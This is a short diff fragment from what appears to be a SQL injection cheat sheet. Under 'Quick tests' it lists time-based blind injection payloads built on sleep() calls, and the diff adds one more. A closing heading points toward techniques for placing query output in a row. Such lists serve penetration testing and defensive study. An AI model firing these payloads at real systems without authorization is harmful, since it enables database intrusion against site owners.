@@ -1,6 +1,7 @@
 # Quick tests
 or sleep(20) #
 'select sleep(20);--
+1'=sleep(10)='1
 
 
 # Check for a row where it's possible to place your output
